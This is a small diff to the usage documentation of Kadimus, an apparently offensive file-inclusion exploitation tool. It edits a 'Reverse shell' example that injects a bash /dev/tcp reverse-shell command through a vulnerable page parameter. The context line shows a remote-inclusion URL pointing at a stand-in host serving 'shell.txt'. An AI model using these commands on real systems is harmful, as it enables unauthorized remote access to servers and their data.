@@ -131,5 +131,5 @@ http://bad-url.com/shell.txt?:scorpion say get over here
 
 ### Reverse shell:
 ```
-./kadimus -t localhost/?pg=contact.php -Xdata --inject-at pg -r -l 12345 -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0>&1 &' --retry-times 0
+./kadimus -t localhost/?pg=contact.php -Xdata --inject-at pg -r -l 12345 -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0>&1' --retry-times 0
 ```
